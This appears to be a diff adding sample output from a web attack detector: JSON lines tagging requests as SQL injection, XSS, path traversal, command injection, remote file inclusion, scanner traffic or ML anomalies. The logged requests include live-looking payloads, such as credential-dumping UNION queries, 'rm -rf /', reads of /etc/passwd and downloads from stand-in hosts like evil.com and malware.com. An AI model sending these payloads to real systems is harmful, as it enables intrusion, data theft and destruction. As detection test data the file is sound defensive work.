@@ -1,0 +1,66 @@
+{"line_no": 1, "client_ip": "192.168.1.100", "matches": [{"id": "SQL_INJECTION", "desc": "Payload contains SQL Injection patterns"}], "detail": "GET /product.php?id=1' OR '1'='1"}
+{"line_no": 2, "client_ip": "192.168.1.100", "matches": [{"id": "SQL_INJECTION", "desc": "Payload contains SQL Injection patterns"}], "detail": "GET /product.php?id=1 UNION SELECT user,password FROM users"}
+{"line_no": 3, "client_ip": "192.168.1.101", "matches": [{"id": "XSS", "desc": "Payload contains XSS patterns"}], "detail": "GET /search?q=<script>alert(1)</script>"}
+{"line_no": 4, "client_ip": "192.168.1.101", "matches": [{"id": "XSS", "desc": "Payload contains XSS patterns"}], "detail": "GET /search?q=<img src=x onerror=alert(1)>"}
+{"line_no": 5, "client_ip": "192.168.1.102", "matches": [{"id": "LFI_PATH_TRAVERSAL", "desc": "Path traversal attempt"}], "detail": "GET /../../etc/passwd"}
+{"line_no": 6, "client_ip": "192.168.1.102", "matches": [{"id": "LFI_PATH_TRAVERSAL", "desc": "Path traversal attempt"}], "detail": "GET /page.php?file=../../windows/win.ini"}
+{"line_no": 7, "client_ip": "192.168.1.103", "matches": [{"id": "LFI_PATH_TRAVERSAL", "desc": "Path traversal attempt"}, {"id": "COMMAND_INJECTION", "desc": "System command injection attempt"}], "detail": "GET /cmd.php?cmd=;cat /etc/passwd"}
+{"line_no": 8, "client_ip": "192.168.1.103", "matches": [{"id": "COMMAND_INJECTION", "desc": "System command injection attempt"}], "detail": "GET /index.php?name=test|whoami"}
+{"line_no": 9, "client_ip": "192.168.1.104", "matches": [{"id": "SENSITIVE_FILE_ACCESS", "desc": "Accessing sensitive files"}, {"id": "SCANNER_TOOL", "desc": "Scanner tool: sqlmap/1.6.10"}], "detail": "GET /admin/config.php"}
+{"line_no": 10, "client_ip": "192.168.1.104", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: sqlmap/1.6.10"}], "detail": "GET /admin/users.php"}
+{"line_no": 11, "client_ip": "192.168.1.105", "matches": [{"id": "SENSITIVE_FILE_ACCESS", "desc": "Accessing sensitive files"}], "detail": "GET /.env"}
+{"line_no": 12, "client_ip": "192.168.1.105", "matches": [{"id": "SENSITIVE_FILE_ACCESS", "desc": "Accessing sensitive files"}], "detail": "GET /.git/config"}
+{"line_no": 13, "client_ip": "192.168.1.106", "matches": [{"id": "COMMAND_INJECTION", "desc": "System command injection attempt"}, {"id": "RFI", "desc": "RFI candidate in param 'url'"}], "detail": "GET /shell.php?url=http://evil.com/malware.sh"}
+{"line_no": 14, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /wp-admin/"}
+{"line_no": 15, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /wp-login.php"}
+{"line_no": 16, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /administrator/"}
+{"line_no": 17, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /backup.zip"}
+{"line_no": 18, "client_ip": "192.168.1.100", "matches": [{"id": "SENSITIVE_FILE_ACCESS", "desc": "Accessing sensitive files"}, {"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /db.sql"}
+{"line_no": 19, "client_ip": "192.168.1.107", "matches": [{"id": "COMMAND_INJECTION", "desc": "System command injection attempt"}], "detail": "GET /?id=1;%20rm%20-rf%20/"}
+{"line_no": 20, "client_ip": "192.168.1.107", "matches": [{"id": "COMMAND_INJECTION", "desc": "System command injection attempt"}], "detail": "GET /?q=`sleep 10`"}
+{"line_no": 21, "client_ip": "192.168.1.108", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Masscan/1.0"}], "detail": "GET /"}
+{"line_no": 22, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /test.php"}
+{"line_no": 23, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /admin.php"}
+{"line_no": 24, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /login.asp"}
+{"line_no": 25, "client_ip": "192.168.1.109", "matches": [{"id": "SQL_INJECTION", "desc": "Payload contains SQL Injection patterns"}], "detail": "GET /index.php?id=1%20and%201=1"}
+{"line_no": 26, "client_ip": "192.168.1.109", "matches": [{"id": "SQL_INJECTION", "desc": "Payload contains SQL Injection patterns"}], "detail": "GET /index.php?id=1%20UNION%20ALL%20SELECT%201,2,3"}
+{"line_no": 27, "client_ip": "192.168.1.110", "matches": [{"id": "SENSITIVE_FILE_ACCESS", "desc": "Accessing sensitive files"}], "detail": "GET /cgi-bin/test-cgi"}
+{"line_no": 28, "client_ip": "192.168.1.110", "matches": [{"id": "LFI_PATH_TRAVERSAL", "desc": "Path traversal attempt"}], "detail": "GET /..%2f..%2fwindows/win.ini"}
+{"line_no": 29, "client_ip": "192.168.1.111", "matches": [{"id": "RFI", "desc": "RFI candidate in param 'p'"}], "detail": "GET /?p=http://attacker.com/shell.txt"}
+{"line_no": 30, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /private/"}
+{"line_no": 31, "client_ip": "192.168.1.100", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /tmp/"}
+{"line_no": 32, "client_ip": "192.168.1.113", "matches": [{"id": "SQL_INJECTION", "desc": "Payload contains SQL Injection patterns"}], "detail": "GET /api/users?id=1;DROP%20TABLE%20users"}
+{"line_no": 33, "client_ip": "192.168.1.100", "matches": [{"id": "SENSITIVE_FILE_ACCESS", "desc": "Accessing sensitive files"}, {"id": "SCANNER_TOOL", "desc": "Scanner tool: Nikto/2.1.6"}], "detail": "GET /config.bak"}
+{"line_no": 34, "client_ip": "192.168.1.114", "matches": [{"id": "XSS", "desc": "Payload contains XSS patterns"}], "detail": "GET /<svg/onload=alert(1)>"}
+{"line_no": 35, "client_ip": "192.168.1.115", "matches": [{"id": "XSS", "desc": "Payload contains XSS patterns"}], "detail": "GET /javascript:alert(1)"}
+{"line_no": 36, "client_ip": "192.168.1.200", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Hydra/9.1"}], "detail": "POST /login.php"}
+{"line_no": 37, "client_ip": "192.168.1.200", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Hydra/9.1"}], "detail": "POST /login.php"}
+{"line_no": 38, "client_ip": "192.168.1.200", "matches": [{"id": "SCANNER_TOOL", "desc": "Scanner tool: Hydra/9.1"}], "detail": "POST /login.php"}
+{"line_no": 39, "client_ip": "192.168.1.201", "matches": [{"id": "LFI_PATH_TRAVERSAL", "desc": "Path traversal attempt"}], "detail": "GET /admin/..;/..;/..;/etc/passwd"}
+{"line_no": 40, "client_ip": "192.168.1.202", "matches": [{"id": "COMMAND_INJECTION", "desc": "System command injection attempt"}], "detail": "GET /?cmd=wget+http://malware.com/bot.sh+-O+/tmp/sh"}
+{"line_no": 1, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /product.php"}
+{"line_no": 2, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /product.php"}
+{"line_no": 3, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /search"}
+{"line_no": 4, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /search"}
+{"line_no": 5, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /../../etc/passwd"}
+{"line_no": 6, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /page.php"}
+{"line_no": 7, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /cmd.php"}
+{"line_no": 8, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /index.php"}
+{"line_no": 9, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /admin/config.php"}
+{"line_no": 10, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /admin/users.php"}
+{"line_no": 11, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /.env"}
+{"line_no": 12, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /.git/config"}
+{"line_no": 13, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /shell.php"}
+{"line_no": 14, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /wp-admin/"}
+{"line_no": 15, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /wp-login.php"}
+{"line_no": 16, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /administrator/"}
+{"line_no": 18, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /db.sql"}
+{"line_no": 26, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /index.php"}
+{"line_no": 27, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /cgi-bin/test-cgi"}
+{"line_no": 28, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /../../windows/win.ini"}
+{"line_no": 30, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /private/"}
+{"line_no": 31, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /tmp/"}
+{"line_no": 32, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /api/users"}
+{"line_no": 34, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /<svg/onload=alert(1)>"}
+{"line_no": 35, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /javascript:alert(1)"}
+{"line_no": 39, "client_ip": "Check_Log", "matches": [{"id": "AI_ANOMALY", "desc": "Abnormal request structure detected by ML"}], "detail": "GET /admin/..;/..;/..;/etc/passwd"}
